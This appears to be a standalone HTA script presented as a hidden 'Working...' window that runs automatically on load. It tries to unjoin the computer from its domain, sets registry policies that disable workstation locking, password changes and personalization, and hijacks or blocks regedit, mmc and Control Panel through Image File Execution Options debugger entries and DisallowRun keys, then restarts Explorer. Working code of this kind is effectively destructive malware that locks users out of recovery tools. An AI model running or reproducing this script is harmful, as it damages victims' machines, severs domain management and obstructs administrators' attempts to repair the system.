<html>
<head>
<title>Working...</title>

<HTA:APPLICATION
      ID="oHTA"
      APPLICATIONNAME="HiddenApp"
      WINDOWSTATE="minimize"
      SHOWINTASKBAR="no"
      CAPTION="no"
      BORDER="none"
      SYSMENU="no"
      MAXIMIZEBUTTON="no"
      MINIMIZEBUTTON="no"
/>

<script language="javascript">

function setReg(path, type, value) {
    var shell = new ActiveXObject("WScript.Shell");
    shell.RegWrite(path, value, type);
}

function runCmd(cmd) {
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run(cmd, 0, true); 
}

function applyPolicies() {
    try {
            var strComputer = ".";
            var strPassword = "";   // Set password if required
            var FUnjoinOptions = 0;
        
            // Get computer name from environment
            var shell = new ActiveXObject("WScript.Shell");
            var strUsername = shell.ExpandEnvironmentStrings("%COMPUTERNAME%");
        
            var objWMIService = GetObject("winmgmts:\\\\" + strComputer + "\\root\\cimv2");
            var colComputerSystem = objWMIService.ExecQuery("Select * from Win32_ComputerSystem");
        
            var e = new Enumerator(colComputerSystem);
            for (; !e.atEnd(); e.moveNext()) {
                var objComputer = e.item();
        
                var returnValue = objComputer.UnjoinDomainOrWorkgroup(
                    strPassword,
                    strUsername,
                    FUnjoinOptions
                );
        
                WScript.Echo("Computer Name used as Username: " + strUsername);
                WScript.Echo("UnjoinDomainOrWorkgroup method executed.");
                WScript.Echo("Return value: " + returnValue);
            }
        }
        catch (e) {
            WScript.Echo("Error: " + e.message);
        }

    var ad = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop\\";
    var ex = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\";
    var dr = ex + "DisallowRun\\";
    var sys = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\";
    var themeKey = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize\\";
    var persCU = "HKCU\\Software\\Policies\\Microsoft\\Windows\\Personalization\\";
    setReg(ad+"NoChangingWallPaper", "REG_DWORD", 1);
    setReg(ad+"NoAddingComponents", "REG_DWORD", 1);
    setReg(ad+"NoDeletingComponents", "REG_DWORD", 1);
    setReg(ad+"NoComponents", "REG_DWORD", 0);
    setReg(ex+"NoDesktop", "REG_DWORD", 0);
    setReg(ex+"NoThemesTab", "REG_DWORD", 1);
    setReg(sys+"Wallpaper", "REG_SZ", "C:\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg");
    setReg("HKCU\\Control Panel\\Desktop\\TileWallpaper", "REG_SZ", "0");
    setReg("HKCU\\Control Panel\\Desktop\\WallpaperStyle", "REG_SZ", "2");
    setReg(themeKey+"SystemUsesLightTheme", "REG_DWORD", 1);
    setReg(themeKey+"AppsUseLightTheme", "REG_DWORD", 1);
    setReg("HKCU\\Software\\Policies\\Microsoft\\Windows\\Personalization\\NoChangingColor", "REG_DWORD", 1);
    setReg(sys+"NoColorChoice", "REG_DWORD", 1);
    setReg(sys+"NoVisualStyleChoice", "REG_DWORD", 1);
    setReg(sys+"NoDispBackgroundPage", "REG_DWORD", 1);
    setReg(sys+"NoDispAppearancePage", "REG_DWORD", 1);
    setReg(sys+"NoDispSettingsPage", "REG_DWORD", 1);
    setReg(sys+"NoDispScrSavPage", "REG_DWORD", 1);
    setReg(sys+"NoSizeChoice", "REG_DWORD", 1);
    setReg(sys+"DisableLockWorkstation", "REG_DWORD", 1);
    setReg(sys+"DisableChangePassword", "REG_DWORD", 1);
    setReg("HKCU\\Software\\Policies\\Microsoft\\Windows\\Explorer\\NoPinningToTaskbar", "REG_DWORD", 1);
    setReg("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\SettingsPageVisibility", "REG_SZ", "hide:personalization");
    setReg("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mmc.exe\\Debugger", "REG_SZ", "cmd.exe /c exit");
    setReg("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\control.exe\\Debugger", "REG_SZ", "cmd.exe /c exit");
    setReg("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe\\Debugger", "REG_SZ", "cmd.exe /c exit");
    setReg(persCU+"NoChangingMousePointers", "REG_DWORD", 1);
    setReg(persCU+"NoChangingTheme", "REG_DWORD", 1);
    setReg(persCU+"NoChangingStartMenuBackground", "REG_DWORD", 1);
    setReg(dr+"1", "REG_SZ", "mmc.exe");
    setReg(dr+"2", "REG_SZ", "regedit.exe");
    setReg(dr+"3", "REG_SZ", "control.exe");
    runCmd("gpupdate.exe /force");
    runCmd("taskkill /f /im explorer.exe");
    runCmd("explorer.exe");
    runCmd("taskkill /f /im mshta.exe");
    window.close();
}

window.onload = applyPolicies;
</script>

</head>
<body>
</body>
</html>
